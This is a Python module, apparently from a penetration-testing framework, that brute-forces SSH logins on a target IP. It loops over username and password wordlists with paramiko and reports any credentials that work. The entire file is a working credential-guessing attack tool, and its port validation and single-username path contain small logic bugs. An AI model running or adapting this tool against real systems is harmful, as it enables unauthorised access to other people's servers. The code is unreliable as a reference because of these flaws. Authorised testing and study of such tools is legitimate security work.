#!/usr/bin/python3

import paramiko
from helpers.colours import plus, minus, warning, info 
from tabulate import tabulate
import os
import ipaddress

class SSHBruteforce(object):

    def __init__(self):

        self.wordlist = [] 

        self.info = {

            'Name': 'SSH Bruteforce',
            'Author': ' Alessandro Cara',
            'Description': 'Bruteforce SSH service'
            }
        self.options = {
            'Port': {
                'Description': 'Port on which SSH is running',
                'Required': True,
                'Value': 22
                },
            'Ip': {
                'Description': 'Ip of the target host',
                'Required': True,
                'Value': ""
                },
            'PasswordWordlist': {
                'Description': 'Path to the password wordlist',
                'Required': True,
                'Value': ""
                },
            'UsernameWordlist': {
                'Description': 'Path to the username wordlist',
                'Required': False,
                'Value': ""
                },
            'Username': {
                'Description': 'Username to be used in the bruteforce attack',
                'Required': False,
                'Value': ""
                }
            }

    def validate_options(self):
        
        for key, value in self.options.items():
            if value['Required'] and value['Value'] == "":
                minus("Please fill all required options")
                return False
        if not self.options['UsernameWordlist']['Value'] and not self.options['Username']['Value']:
            minus("Please insert either a username or a wordlist of usernames")
            return False

        if not os.path.exists(self.options['PasswordWordlist']['Value']):
            minus("The password wordlist could not be found")
            return False

        if self.options['UsernameWordlist']['Value'] and not os.path.exists(self.options['UsernameWordlist']['Value']):
            minus("The username wordlist could not be found")
            return False
        
        try:
            if int(self.options['Port']['Value']) > 65535 and int(self.options['Port']['Value']) < 0:
                minus("Please insert a valid port (between 0-65535")
                return False
        except Exception:
            minus("The port has to be a number")
            return False

        try:
            ipaddress.ip_address(self.options['Ip']['Value'])
        except ValueError:
            minus("The ip address is not valid")
            return False

        return True

    def print_options(self):
        table = []
        for key, value in self.options.items():

            table.append([key, value['Description'], value['Value'], value['Required']])

        print(tabulate(table, headers=["Option", "Description", "Value", "Required"], tablefmt="grid"))

    def print_into(self):
        table = []
        for key, value in self.info.items():
            table.append([key, value])

        print(tabulate(table, headers=["Info", "Value"], tablefmt="grid"))

    def parse_wordlist(self, path):
        try:
            with open(path) as wd:
                return wd.read().splitlines()
        except Exception:
            minus("Failed to load wordlist %s" % path)
            return None

    def run(self):
        if not self.validate_options():
            return

        username_wordlist = None
        creds = []

        if self.options['UsernameWordlist']['Value']:
            username_wordlist = self.parse_wordlist(self.options['UsernameWordlist']['Value'])
            if not username_wordlist:
                return

        password_wordlist = self.parse_wordlist(self.options['PasswordWordlist']['Value'])

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        info("Attempting to bruteforce SSH credentials on %s" % self.options['Ip']['Value'])
        if not username_wordlist:
            for word in password_wordlist:
                try:
                    client.connect(self.options['Ip']['Value'], port=self.options['Port']['Value'], username=self.options['Username']['Value'], password=word, timeout=0.5, allow_agent=False, look_for_keys=False)
                    plus("Valid credentials found %s:%s" % (self.options['Username']['Value'], word))
                    return
                except Exception:
                    pass

        for username in username_wordlist:
            for word in password_wordlist:
                try:
                    client.connect(self.options['Ip']['Value'], port=self.options['Port']['Value'], username=username, password=word, timeout=0.5, allow_agent=False, look_for_keys=False)
                    plus("Valid credentials found %s:%s" % (username, word))
                    creds.append(username + ":" + word)
                    break

                except Exception:
                    pass

        if not creds:
            minus("Could not find any valid credentials")




